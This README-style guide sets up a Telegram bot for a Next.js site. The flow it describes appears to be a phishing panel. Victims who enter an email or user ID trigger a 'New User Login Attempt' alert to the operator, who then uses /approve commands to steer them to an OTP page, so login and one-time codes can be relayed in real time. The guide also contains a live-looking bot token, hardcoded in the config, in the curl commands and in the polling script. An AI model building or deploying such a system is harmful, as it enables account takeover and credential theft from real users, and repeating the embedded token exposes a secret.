# Telegram Bot Setup - Automatic Notifications

## Quick Setup Guide

### Step 1: Get Your Telegram Chat ID

1. Open Telegram and search for **@userinfobot**
2. Start a chat - it will show your Chat ID (a number like `123456789`)
3. Save this number - you'll need it for `TELEGRAM_CHAT_ID`

### Step 2: Configure Environment Variables

Add to your `.env.local` file:

```env
TELEGRAM_BOT_TOKEN=8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw
TELEGRAM_CHAT_ID=your_chat_id_here
NEXT_PUBLIC_APP_URL=https://your-domain.com
```

Replace:
- `your_chat_id_here` with your actual Chat ID from Step 1
- `https://your-domain.com` with your actual domain (or `http://localhost:3000` for local dev)

### Step 3: Set Up Telegram Webhook

Your bot needs to receive commands. You have two options:

#### Option A: Webhook (Recommended for Production)

Set webhook URL to receive commands:

```bash
curl -X POST "https://api.telegram.org/bot8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw/setWebhook?url=https://your-domain.com/api/telegram/webhook"
```

#### Option B: Polling (For Local Development)

Use a simple script to poll for updates (see below)

### Step 4: Test the Integration

1. Start your Next.js app: `npm run dev`
2. Open Telegram and send `/start` to your bot
3. Visit your website and enter a User ID
4. You should receive a notification in Telegram
5. Reply with `/approve_<activityId>` to redirect user to OTP page

## How It Works

1. **User enters User ID** → Activity is logged → **Telegram notification sent automatically**
2. **Loading screen shows** on website
3. **You receive notification** in Telegram with activity details
4. **You send `/approve_<activityId>`** command
5. **User is redirected** to OTP page

## Telegram Commands

- `/start` - Initialize bot and show help
- `/approve_<activityId>` - Approve activity and redirect user to OTP page
- `/activities` - View recent activities

## Example Flow

```
User visits website → Enters "john@example.com" → Clicks Continue
    ↓
Website shows loading screen
    ↓
You receive Telegram notification:
    🔔 New User Login Attempt
    
    User ID: john@example.com
    Activity ID: 1234567890
    Time: 1/1/2025, 12:00:00 PM
    
    Click to approve: /approve_1234567890
    ↓
You send: /approve_1234567890
    ↓
User is redirected to OTP page ✅
```

## Troubleshooting

### Not receiving notifications?
- Check `TELEGRAM_BOT_TOKEN` is correct in `.env.local`
- Check `TELEGRAM_CHAT_ID` is your correct Chat ID
- Restart your Next.js server after changing `.env.local`

### Webhook not working?
- Make sure your domain is accessible
- Check webhook is set: `curl "https://api.telegram.org/bot8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw/getWebhookInfo"`
- For local dev, use polling instead

### For Local Development (Polling)

Create `telegram_polling.js`:

```javascript
const TELEGRAM_BOT_TOKEN = '8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw';
const WEBHOOK_URL = 'http://localhost:3000/api/telegram/webhook';

async function pollTelegram() {
  let offset = 0;
  
  while (true) {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=10`
      );
      const data = await response.json();
      
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          // Forward to webhook
          await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(update)
          });
          offset = update.update_id + 1;
        }
      }
    } catch (error) {
      console.error('Polling error:', error);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}

pollTelegram();
```

Run: `node telegram_polling.js`

